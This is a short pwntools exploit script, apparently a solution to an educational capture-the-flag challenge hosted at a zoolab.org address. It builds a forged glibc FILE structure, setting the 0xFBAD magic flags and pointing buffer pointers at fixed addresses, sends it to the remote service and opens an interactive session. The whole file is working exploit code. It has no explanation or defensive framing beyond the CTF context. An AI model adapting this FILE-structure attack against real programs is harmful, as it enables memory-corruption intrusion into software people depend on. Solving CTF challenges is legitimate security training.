from pwn import *
context.arch = "amd64"

r = remote('edu-ctf.zoolab.org', '10009')
# r = process('./share/chal')

NO_READ = 0x4
EOF_SEEN = 0x10
MAGIC = 0xFBAD0000
CURRENT_PUTTING = 0x800

flag = 0
flag &= ~(NO_READ|EOF_SEEN)
flag |= MAGIC

fileno = 0
read_end = read_ptr = 0
buf_base = write_base = 0x404070
buf_end = 0x404080

instruction = flat(
    0x0, 0x0, 
    0x0, 0x0,
    flag, read_ptr,
    read_end, 0x0,
    write_base, 0x0,
    0x0, buf_base,
    buf_end, 0x0, 
    0x0, 0x0, 
    0x0, 0x0, 
    fileno,
)

r.send(instruction)
r.interactive()